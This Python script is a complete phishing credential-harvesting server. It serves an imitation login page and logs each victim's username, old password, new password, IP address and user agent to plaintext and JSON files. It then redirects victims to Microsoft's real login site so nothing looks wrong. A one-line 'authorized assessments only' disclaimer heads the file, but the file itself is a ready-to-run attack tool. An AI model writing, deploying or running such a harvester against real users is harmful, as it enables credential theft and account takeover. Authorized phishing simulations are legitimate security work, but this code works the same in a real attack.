#!/usr/bin/env python3
"""Credential harvesting server - for authorized phishing assessments only.
Stdlib only. Run:  sudo python3 phish.py
"""
import http.server
import json
import socket
from datetime import datetime
from urllib.parse import parse_qs

LISTEN_IP   = "0.0.0.0"
LISTEN_PORT = 8080
LOG_FILE    = "credentials.txt"   # easy-to-read capture log
RAW_FILE    = "requests.jsonl"    # full JSON log for tooling
REDIRECT_TO = "https://login.microsoftonline.com/"  # where victims land after "login"

# Replace the whole LOGIN_PAGE = """...""" block with:
LOGIN_PAGE = open("Login.html", encoding="utf-8").read()

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/Login.html"):
            body = LOGIN_PAGE.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path == "/Colores.css":
            body = open("Colores.css", encoding="utf-8").read().encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/css; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_error(404)

    def do_POST(self):
        # Read the submitted form
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", "replace")
        fields = parse_qs(raw)
        username = fields.get("username", [""])[0]
        old_password = fields.get("oldpassword", [""])[0]
        new_password = fields.get("newPassword", [""])[0]
        ip   = self.client_address[0]
        ua   = self.headers.get("User-Agent", "")
        ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # --- Capture the credentials ---------------------------------
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {ip} | {username} | {old_password} | {new_password} | {ua}\n")
        with open(RAW_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps({"ts": ts, "ip": ip, "ua": ua,
                                "user": username, "old_pass": old_password, "new_pass": new_password}) + "\n")
        print(f"[{ts}] [+] {ip} submitted: {username} / {old_password} / {new_password}")

        # --- Redirect to the real site so the victim sees nothing odd --
        self.send_response(302)
        self.send_header("Location", REDIRECT_TO)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass  # silence default request logging

if __name__ == "__main__":
    server = http.server.ThreadingHTTPServer((LISTEN_IP, LISTEN_PORT), Handler)
    host = socket.gethostbyname(socket.gethostname())
    print(f"[*] Phish server listening on http://{host}:{LISTEN_PORT}")
    print(f"[*] Captures -> {LOG_FILE}  |  redirect -> {REDIRECT_TO}")
    server.serve_forever()
